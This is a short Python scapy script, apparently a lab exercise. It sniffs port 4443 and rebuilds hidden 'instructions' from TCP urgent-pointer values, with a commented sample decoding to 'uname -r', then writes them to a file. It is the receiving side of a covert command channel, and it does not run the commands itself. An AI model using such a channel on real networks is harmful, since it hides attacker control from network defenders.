from scapy.all import *

#num_arr = [32, 32, 117, 110, 97, 109, 101, 32, 45, 114, 32, 32]
num_arr = []
instruction_str = []
def int_to_ascii():
        global num_arr
        global instruction_str
        for n in num_arr:
                ascii_char = str(chr(n))
                instruction_str.append(ascii_char)
                print(ascii_char)
        f = open("instr.txt", "w")
        f.write("".join(instruction_str))
        f.close()
        print("".join(instruction_str))
        num_arr = []
        instruction_str = []

#int_to_ascii()
#print(instruction_str)
#instruction_string = "".join(instruction_str)
#print(instruction_string)

def view_attack_code(pckt):
        print("working")
        print(pckt[TCP].urgptr)
        #ip = IP()
        #tcp = TCP()
        #raw = Raw()
        if (pckt.getlayer(Raw) and pckt[IP].dst == "172.168.1.5" and pckt[TCP].urgptr != 0):
                #print(pckt.getlayer(Raw))
                #ip = pckt[IP]
                #tcp = pckt[TCP]
                #raw = pckt[Raw]
                #tcp.urgptr = 1
                #sender = ip/tcp
                #print(sender[TCP].urgptr)
                #pckt.show()
                num_arr.append(pckt[TCP].urgptr)
                print(pckt[TCP].urgptr)
                print(num_arr)
                #send(pckt)
        len_arr = len(num_arr)
        if (len_arr >= 5):
                if (num_arr[len_arr - 2] == 32 and num_arr[len_arr - 1] == 32):
                        int_to_ascii()
                        print(instruction_str)
         #print(pkt.summary())

#sniff(filter="port 4443", prn=view_attack_code)
sniff(filter="port 4443", prn = view_attack_code)
